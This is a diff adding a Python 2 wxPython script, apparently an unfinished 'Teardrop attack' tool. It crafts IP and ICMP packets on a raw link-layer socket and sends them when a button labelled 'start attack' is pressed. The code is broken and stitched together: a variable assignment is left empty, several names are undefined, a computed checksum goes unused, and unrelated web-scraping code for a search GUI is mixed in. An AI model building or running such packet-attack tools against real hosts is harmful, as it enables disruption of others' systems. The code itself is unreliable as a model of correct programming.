@@ -1,0 +1,249 @@
+#coding=gbk
+import sys
+import os
+import wx
+import urllib
+import urllib2
+#import BeautifulSoup
+
+import struct
+import socket
+import sys
+import ctypes
+import time
+
+
+
+
+
+
+# ip header format
+#0                   1                   2                   3   
+#    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 
+#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+#   |Version|  IHL  |Type of Service|          Total Length         |
+#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+#   |         Identification        |Flags|      Fragment Offset    |
+#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+#   |  Time to Live |    Protocol   |         Header Checksum       |
+#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+#   |                       Source Address                          |
+#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+#   |                    Destination Address                        |
+#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+#   |                    Options                    |    Padding    |
+#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+#udp header format
+#0      7 8     15 16    23 24    31  
+# +--------+--------+--------+--------+ 
+# |     Source      |   Destination   | 
+# |      Port       |      Port       | 
+# +--------+--------+--------+--------+ 
+# |                 |                 | 
+# |     Length      |    Checksum     | 
+# +--------+--------+--------+--------+ 
+# |                                     
+# |          data octets ...            
+# +---------------- ...
+
+
+ac_ip = "193.168.1.1"
+ac_ip_net = struct.pack("!4s", socket.inet_aton(ac_ip))
+
+
+ICMP_ECHO_REQUEST = 8
+
+ICMP_ID = 1
+HostDev = 
+
+
+try:
+        link_raw_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
+        link_raw_sock.bind((HostDev, socket.SOCK_RAW))
+except socket.error , msg:
+        print 'link_raw_sock could not create socket, error code: ' + str(msg[0]) + ' Message ' + msg[1] 
+        sys.exit(-1)
+
+HostMac = link_raw_sock.getsockname()[4]
+print HostMac
+
+
+
+
+def checksum(source_string):
+    """
+    I'm not too confident that this is right but testing seems
+    to suggest that it gives the same answers as in_cksum in ping.c
+    """
+    sum = 0
+    countTo = (len(source_string)/2)*2
+    count = 0
+    while count<countTo:
+        thisVal = ord(source_string[count + 1])*256 + ord(source_string[count])
+        sum = sum + thisVal
+        sum = sum & 0xffffffff # Necessary?
+        count = count + 2
+  
+    if countTo<len(source_string):
+        sum = sum + ord(source_string[len(source_string) - 1])
+        sum = sum & 0xffffffff # Necessary?
+  
+    sum = (sum >> 16)  +  (sum & 0xffff)
+    sum = sum + (sum >> 16)
+    answer = ~sum
+    answer = answer & 0xffff
+  
+    # Swap bytes. Bugger me if I know why.
+    answer = answer >> 8 | (answer << 8 & 0xff00)
+  
+    return answer
+  
+
+
+
+
+def SetIpHeader(ip_src_addr,ip_dst_addr,ip_ihl,ip_ver, ip_tos ,ip_tot_len, ip_id,ip_frag_flag,ip_frag_off,ip_ttl , ip_proto ,ip_check):
+    ihl_ver = (ip_ver << 4) | ip_ihl
+    ip_frag = (ip_frag_flag << 13) | ip_frag_off
+    ip_header = struct.pack('!BBHHHBBH', ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag, ip_ttl, ip_proto, 0) + ip_src_addr + ip_dst_addr
+    return ip_header
+
+
+
+def SetIcmp():
+    my_checksum = 0
+    icmpheader=struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, my_checksum, ICMP_ID, 1)
+
+    bytesInDouble = struct.calcsize("d")
+    data = (192 - bytesInDouble) * "Q"
+    data = struct.pack("d", time.time()) + data
+  
+    # Calculate the checksum on the data and the dummy header.
+    my_checksum = checksum(icmpheader + data)
+  
+    # Now that we have the right checksum, we put that in. It's just easier
+    # to make up a new header than to stuff it into the dummy.
+    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), ID, 1)
+    packet = icmpheader + data
+    return packet
+
+
+
+
+
+
+
+
+def SendIcmpMsg():
+    ''' send icmp msg '''
+    try:
+        SrcMac = HostMac
+        DstMac = TargetMac
+        SenderIp = host_ip
+        TargetIp = dst_ip
+        icmp = SetIcmp()
+     
+        
+        ip_head = SetIpHeader(ap_ip, ac_ip_net, 5, 4, 0, totel_len, 1, 0, 255, socket.IPPROTO_UDP, 0)
+        packet = DstMac + SrcMac + '\x45\x00' + ip_head + icmp_head 
+        link_raw_sock.send(packet)
+    except socket.error , msg:
+        print 'link_raw_sock.send fail, error code: ' + str(msg[0]) + ' Messege ' + msg[1]
+        sys.exit(-1)
+
+
+
+
+
+    
+
+def teardrop_attack(event):
+    SendIcmpMsg()
+
+
+    
+
+def urlget(url):
+    html = urllib2.urlopen(url.encode('utf-8')).read().decode("utf-8")
+    soup=BeautifulSoup(html)
+    print soup
+    div=soup.find("div",id="dataidea_1")
+    for links in div.find_all("a",title=True):
+         links.get("title")
+   
+    print links.get("href")
+    html1=urllib2.urlopen(links.get("href"),timeout=5).read()
+    soup1=BeautifulSoup(html1)
+    div1=soup1.find("div",class_="redline")
+    if div1!=None:
+        
+        for link1 in div1.find_all("a",href=True):
+             print link1.get_text()
+        if soup1.find("p","txt_font1")!=None:
+            if  soup1.find("p","txt_font1").get_text().find("tp")>1:
+                print soup1.find("p","txt_font1").get_text()
+
+    print "\n"
+    print "\n"
+    pass
+
+
+
+def grab(event):
+    keyword = searchkeyword.GetValue()
+    
+    if bool(keyword) == 0:
+        wx.MessageBox("请输入搜索关键字!", u"出错提示", 
+        wx.OK | wx.ICON_INFORMATION)
+        return
+    else:
+        print keyword
+
+    
+    
+
+    pass
+
+def list(event):
+    
+    pass
+def save(event):
+    
+    savedlg = wx.FileDialog(win,u"保存结果到XML",
+            os.getcwd(),style=wx.SAVE | wx.OVERWRITE_PROMPT,
+                            wildcard="*.xml")
+    savedlg.ShowModal()
+    pass
+    
+app=wx.App()
+win=wx.Frame(None,title="TEARDROP　ATTACK",size=(820,670))
+
+bkg=wx.Panel(win)
+
+teardropBtn = wx.Button(bkg,label=u"开始攻击")
+#listBtn = wx.Button(bkg,label=u"列出结果")
+#saveBtn = wx.Button(bkg,label=u"保存结果")
+
+teardropBtn.Bind(wx.EVT_BUTTON,teardrop_attack)
+#listBtn.Bind(wx.EVT_BUTTON,list)
+#saveBtn.Bind(wx.EVT_BUTTON,save)
+
+searchkeyword = wx.TextCtrl(bkg)
+companyinfo = wx.TextCtrl(bkg,style=wx.TE_MULTILINE | wx.HSCROLL)
+
+hbox = wx.BoxSizer()
+#hbox.Add(searchkeyword,proportion=1,flag=wx.EXPAND)
+hbox.Add(teardropBtn,proportion=0,flag=wx.LEFT,border=5)
+#hbox.Add(listBtn,proportion=0,flag=wx.LEFT,border=5)
+
+vbox = wx.BoxSizer(wx.VERTICAL)
+#vbox.Add(hbox,proportion=0,flag=wx.EXPAND | wx.ALL,border=5)
+#vbox.Add(companyinfo,proportion=1,flag=wx.EXPAND |wx.LEFT | wx.BOTTOM |wx.RIGHT,border=5)
+bkg.SetSizer(vbox)
+#vbox.Add(saveBtn,proportion=0,flag=wx.EXPAND,border=4)
+win.Show()
+app.MainLoop()
+
+
+ 
